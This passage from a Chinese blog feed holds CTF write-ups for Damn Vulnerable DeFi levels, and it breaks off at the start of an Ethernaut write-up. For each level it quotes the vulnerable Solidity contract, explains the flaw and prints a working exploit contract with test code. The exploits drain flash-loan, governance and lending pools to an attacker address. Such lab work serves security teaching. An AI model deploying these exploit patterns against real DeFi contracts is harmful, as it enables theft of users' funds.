&quot;.&#x2F;FlashLoanerPool.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;TheRewarderPool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract RewarderExploit&#123;</span><br><span class="line"></span><br><span class="line">    FlashLoanerPool loanpool;</span><br><span class="line">    TheRewarderPool rewardpool;</span><br><span class="line">    RewardToken public immutable rewardToken;</span><br><span class="line">    DamnValuableToken public immutable liquidityToken;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    constructor(address _loanpool, address _rewardpool, address _tokenAddress, address _rewardToken)&#123;</span><br><span class="line">        loanpool &#x3D; FlashLoanerPool(_loanpool);</span><br><span class="line">        rewardpool &#x3D; TheRewarderPool(_rewardpool);</span><br><span class="line">        liquidityToken &#x3D; DamnValuableToken(_tokenAddress);</span><br><span class="line">        rewardToken &#x3D; RewardToken(_rewardToken);</span><br><span class="line">        attacker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount) public &#123;</span><br><span class="line">        loanpool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(uint256 _amount) payable external&#123;</span><br><span class="line">        liquidityToken.approve(address(rewardpool), _amount);</span><br><span class="line">        rewardpool.deposit(_amount);</span><br><span class="line">        uint256 rewards &#x3D; rewardpool.distributeRewards();</span><br><span class="line">        rewardToken.transfer(attacker, rewards);</span><br><span class="line">        rewardpool.withdraw(_amount);</span><br><span class="line">        liquidityToken.transfer(address(loanpool), _amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>总结<br>这应该是所有希望激励用户存款的系统都会面临的漏洞（暂且叫闪借攻击吧），即使您为了防止来自闪借攻击，强制将回合开始（快照）放在与流动性存款不同的交易，拥有大量代币的用户仍然可以在一轮结束时存入它们，并在新一轮开始后立即提款。你的协议可能希望激励长期质押，而不是短期套利交易。<br>因此，最好是摆脱回合，根据存款的每一秒来计算奖励，就像今天许多现代DeFi项目所做的那样。</li></ul><h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><p>这个题和以往的题唯一不同的地方，就是多了一个治理机制。但同时，这个治理机制如果不安全，反而会适得其反。</p><ul><li><strong>SelfiePool</strong><br>这个池里有一个闪电贷的函数，同时有一个特殊的可以转出所有资金的函数<code>drainAllFunds()</code>。值得注意的是这个函数有一个修饰符<code>onlyGovernance</code>也就是只能被治理合约所调用，看起来非常安全，但其实我们一旦获得治理合约的控制权，我们就可以榨干<code>SelfiePool</code>.</li><li><p><strong>SimpleGovernance</strong><br>这就是之前提到的治理合约，显而易见的是我们需要在这里面找到漏洞干一些坏事。让我们来看看吧。<br>  这个合约比较复杂，我们简单说一说</p><ul><li>queueAction<blockquote><p>通过这个函数我们可以把data放进队列，而为了成功排队，我们必须拥有总供应量的一半以上，而由于我们现在有闪借池，这点很容易绕过。<br>  我们无法立即执行操作，因为有2天的延迟，我们必须先等待。但是，我们在这里所要做的就是将时间快进2天，因为没有什么可以确保我们在延迟期间仍然持有这些治理令牌</p></blockquote></li><li>executeAction<br>这个函数使用来执行的，按照队列id一个交易一个交易的执行，但是这个函数明显是有借入风险的，我们只需要把作为参数传入的address改为我们想借入的合约地址，然后在排队的时候修改<code>data</code>的内容，很容易做到这一点。这样，我们就可以冒充治理合约来调用<code>drainAllFunds()</code>了。</li></ul></li><li><p><strong>Exploit</strong><br>根据以上分析写出Exploit如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;SelfiePool.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfieExploit &#123;</span><br><span class="line"></span><br><span class="line">    SimpleGovernance public goverance;</span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    address attcker;</span><br><span class="line">    uint256 actionId;</span><br><span class="line">    constructor(address _pool, address _goverance)&#123;</span><br><span class="line">        pool &#x3D; SelfiePool(_pool);</span><br><span class="line">        goverance &#x3D; SimpleGovernance(_goverance);</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit (uint256 _amount) public &#123;</span><br><span class="line">        pool.flashLoan(_amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveTokens (address _token, uint256 amount) external &#123;</span><br><span class="line">        DamnValuableTokenSnapshot token &#x3D; DamnValuableTokenSnapshot(_token);</span><br><span class="line">        token.snapshot();</span><br><span class="line">        actionId &#x3D; goverance.queueAction(address(pool),</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;drainAllFunds(address)&quot;,</span><br><span class="line">                attcker</span><br><span class="line">            ),</span><br><span class="line">            0); </span><br><span class="line">        token.transfer(address(pool), amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function drainToAttacker() external &#123;</span><br><span class="line">        goverance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>总结：治理合约越复杂，越可能出现漏洞，一定谨慎。</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Damn Defi 题解 1-4</title>
      <link href="/DamnDefi-01-04/"/>
      <url>/DamnDefi-01-04/</url>
      
        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-1-4"><a href="#Damn-Defi靶场刷题记录-1-4" class="headerlink" title="Damn Defi靶场刷题记录(1-4)"></a>Damn Defi靶场刷题记录(1-4)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>这一关没有什么太大的难度，主要是带领进入Damn的题目</p><p>这道题是想让我们让这个闪电贷池停止工作</p><p>我们首先看一下合约<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;security&#x2F;ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title UnstoppableLender</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line">contract UnstoppableLender is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        require(tokenAddress !&#x3D; address(0), &quot;Token address cannot be zero&quot;);</span><br><span class="line">        damnValuableToken &#x3D; IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositTokens(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Must deposit at least one token&quot;);</span><br><span class="line">        &#x2F;&#x2F; Transfer token from sender. Sender must have first approved them.</span><br><span class="line">        damnValuableToken.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        poolBalance &#x3D; poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Ensured by the protocol via the &#96;depositTokens&#96; function</span><br><span class="line">        assert(poolBalance &#x3D;&#x3D; balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以注意到这个闪电贷函数是有明显问题的<br><code>assert(poolBalance == balanceBefore);</code>这个判断不严谨，poolBalance只有在调用depositTokens()函数存款时，才会增加，而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加，但poolBalance并没有改变，这就会造成此闪电贷池宕机。</p><ul><li>解题步骤：<br>我们只需要向该合约提交一笔转账即可<br><code>await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );</code></li></ul><h2 id="naive-reciever"><a href="#naive-reciever" class="headerlink" title="naive-reciever"></a>naive-reciever</h2><p> 先看合约<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> contract NaiveReceiverLenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    uint256 private constant FIXED_FEE &#x3D; 1 ether; &#x2F;&#x2F; not the cheapest flash loan</span><br><span class="line"></span><br><span class="line">    function fixedFee() external pure returns (uint256) &#123;</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore &#x3D; address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough ETH in pool&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        require(address(borrower).isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        &#x2F;&#x2F; Transfer ETH and handle control to receiver</span><br><span class="line">        (bool success, ) &#x3D; borrower.call&#123;value: borrowAmount&#125;(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                FIXED_FEE</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;External call failed&quot;);</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            address(this).balance &gt;&#x3D; balanceBefore.add(FIXED_FEE),</span><br><span class="line">            &quot;Flash loan hasn&#39;t been paid back&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Allow deposits of ETH</span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><strong>分析</strong><br>这个flashloan函数只要被调用一次就会抽取1ETH的小费，在这种时候，接收器必须要判断消息的发送者是否为自己，否则任何人都可以冒充接收器发送闪电贷请求。导致自己token的流失。</li></ul><ul><li><strong>Exploit</strong><br>只需要循环调用flashloan函数即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(let i &#x3D; 0; i &lt; 10; i++)&#123;</span><br><span class="line">            await this.pool.connect(attacker).flashLoan(this.receiver.address, &quot;0&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>这又是一个关于外部调用的一个漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;security&#x2F;ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress) &#123;</span><br><span class="line">        damnValuableToken &#x3D; IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(borrower, borrowAmount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><strong>分析</strong><br><code>ReentrancyGuard</code>并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。</li><li><strong>Exploit</strong><br>我们注意到在此合约中指定了token地址，那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池<code>approve</code>给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。<br>攻击合约如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;.&#x2F;TrusterLenderPool.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface ITrusterLenderPool&#123;</span><br><span class="line">    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterExploit&#123;</span><br><span class="line">    ITrusterLenderPool cons;</span><br><span class="line">    uint256 balanceOfPool;</span><br><span class="line">    address tokenAdr;</span><br><span class="line">    address poolAdr;</span><br><span class="line">    constructor(address _pool, uint256 BalanceOfPool, address _token)&#123;</span><br><span class="line">        cons &#x3D; ITrusterLenderPool(_pool);</span><br><span class="line">        poolAdr &#x3D; _pool;</span><br><span class="line">        balanceOfPool &#x3D; BalanceOfPool;</span><br><span class="line">        tokenAdr &#x3D; _token;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), balanceOfPool));</span><br><span class="line">        IERC20 token &#x3D; IERC20(tokenAdr);</span><br><span class="line">        token.transferFrom(poolAdr, msg.sender,balanceOfPool);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">      &#x2F;** CODE YOUR EXPLOIT HERE  *&#x2F;</span><br><span class="line">      const attackconst &#x3D; await ethers.getContractFactory(&#39;TrusterExploit&#39;, attacker);</span><br><span class="line">      this.exploit &#x3D; await attackconst.deploy(this.pool.address, TOKENS_IN_POOL, this.token.address);</span><br><span class="line">      await this.exploit.connect(attacker).attack();</span><br><span class="line">      </span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="side-entrance"><a href="#side-entrance" class="headerlink" title="side-entrance"></a>side-entrance</h2><p>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amountToWithdraw &#x3D; balances[msg.sender];</span><br><span class="line">        balances[msg.sender] &#x3D; 0;</span><br><span class="line">        payable(msg.sender).sendValue(amountToWithdraw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;&#x3D; amount, &quot;Not enough ETH in balance&quot;);</span><br><span class="line">        </span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><p><strong>分析</strong><br>通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘<code>require(address(this).balance &gt;= balanceBefore</code>这里检查的是当前合约的余额，而不是检查的借贷池里的余额，这导致我们可以通过存款<code>deposit</code>来伪造我们已经还款的事件。我们只需要在<code>receiver</code>里面存款，就可以使我们的balance不断增加。最后提款即可</p></li><li><p><strong>Expolit</strong><br>根据分析写出攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">&#x2F;&#x2F;     function execute() external payable;</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceExploit is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    address payable attacker;</span><br><span class="line">    constructor(address _pool)&#123;</span><br><span class="line">        pool &#x3D; SideEntranceLenderPool(_pool);</span><br><span class="line">        attacker &#x3D; payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount) public&#123;</span><br><span class="line">        pool.flashLoan(_amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable override &#123;</span><br><span class="line">        pool.deposit&#123;value:address(this).balance&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        attacker.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">        const sideEnranceExploit &#x3D; await ethers.getContractFactory(&#39;SideEntranceExploit&#39;, attacker);</span><br><span class="line">        this.exploit &#x3D; await sideEnranceExploit.deploy(this.pool.address);</span><br><span class="line">        await this.exploit.connect(attacker).attack(ETHER_IN_POOL);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 13-19</title>
      <link href="/2022-11-03-ethernaut03/"/>
      <url>/2022-11-03-ethernaut03/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-13-19"><a href="#Ethernaut靶场刷题记录-13-19" class="headerlink" title="Ethernaut靶场刷题记录(13-19)"></a>Ethernaut靶场刷题记录(13-19)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><p>这关主要是考查对solidity合约基础知识的了解。<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span 